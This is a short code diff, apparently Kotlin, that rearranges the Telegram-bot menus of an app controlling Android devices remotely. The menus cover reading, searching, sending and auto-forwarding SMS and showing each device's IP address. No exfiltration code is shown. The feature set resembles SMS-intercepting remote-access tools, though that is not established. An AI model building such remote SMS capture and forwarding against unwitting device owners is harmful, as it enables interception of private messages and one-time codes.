@@ -193,7 +193,7 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
                 ForwardManager.clearAll(context)
                 sendMessage(chatId, "🗑️ All forward targets removed.", buildForwardMenu())
             }
-            data == "fwd_back"  -> showManageDevices(chatId)
+            data == "fwd_back"  -> showSmsManager(chatId)
 
             data == "action_cancel" -> {
                 userState.remove(chatId); userTempData.remove(chatId)
@@ -236,10 +236,6 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
                     put(btn("💬 SMS Manager", "device_sms"))
-                    put(btn("✉️ Send Message", "menu_send"))
-                })
-                put(JSONArray().apply {
-                    put(btn("📋 Auto-Forward", "menu_forwards"))
                 })
                 if (status == ConnectionMonitor.Status.OFFLINE) {
                     put(JSONArray().apply { put(btn("🔄 Reconnect Now", "action_reconnect")) })
@@ -281,6 +277,7 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
                     put(btn("🔀 Forwards ($fwdCount)", "sms_forward"))
                 })
                 put(JSONArray().apply {
+                    put(btn("✉️ Send Message", "menu_send"))
                     put(btn("🔍 Search SMS", "sms_search"))
                 })
                 put(JSONArray().apply {
